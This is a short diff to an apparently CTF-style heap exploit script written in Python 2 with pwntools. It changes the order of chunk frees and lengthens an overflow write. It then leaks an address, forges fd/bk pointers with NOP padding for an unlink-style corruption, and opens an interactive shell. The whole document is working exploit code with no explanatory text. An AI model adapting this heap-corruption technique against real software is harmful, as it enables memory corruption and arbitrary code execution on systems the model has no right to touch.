@@ -43,13 +43,14 @@ login()
 for i in range(8):
   alloc("A")
 
-print "[*] free 3rd chunk"
-free('3')
-print "[*] free 1st chunk"
+print "[*] free chunk_1"
 free('1')
 
-print "[*] update 0th chunk"
-write('0','A'*63)
+print "[*] free chunk_3"
+free('3')
+
+print "[*] update chunk_0"
+write('0','A'*71)
 
 leak = u32(print_all().split('\n')[1])
 
@@ -66,13 +67,13 @@ payload += "\x90" * (64 - len(payload))
 payload += p64(fd)
 payload += p64(bk)
 
-print "[*] free 6th chunk"
+print "[*] free chunk_6"
 free('6')
 
-print "[*] update 5th chunk"
+print "[*] update chunk_5"
 write('5', payload)
 
-print "[*] free 7th chunk"
+print "[*] free chunk_7"
 free('7')
 
 p.interactive()
